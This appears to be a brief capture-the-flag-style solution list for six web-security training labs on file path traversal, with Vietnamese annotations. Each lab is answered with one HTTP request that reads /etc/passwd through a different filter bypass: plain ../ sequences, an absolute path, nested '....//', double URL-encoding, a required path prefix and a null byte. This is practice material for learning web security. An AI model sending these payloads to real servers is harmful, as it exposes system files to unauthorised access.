## 1. LAB ##

# 1. Lab: File path traversal, simple case

`GET /image?filename=../../../etc/passwd HTTP/2`

Dùng ../ để đi lên thư mục cha --> relative path

# 2. Lab: File path traversal, traversal sequences blocked with absolute path bypass

`GET /image?filename=/etc/passwd HTTP/2`

# 3. Lab: File path traversal, traversal sequences stripped non-recursively

`GET /image?filename=....//....//....//etc/passwd HTTP/2`

# 4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

`GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/2`

# 5. Lab: File path traversal, validation of start of path

`GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2`

# 6. Lab: File path traversal, validation of file extension with null byte bypass

`GET /image?filename=../../../etc/passwd%00.png HTTP/2`

## 2. NOTE ##
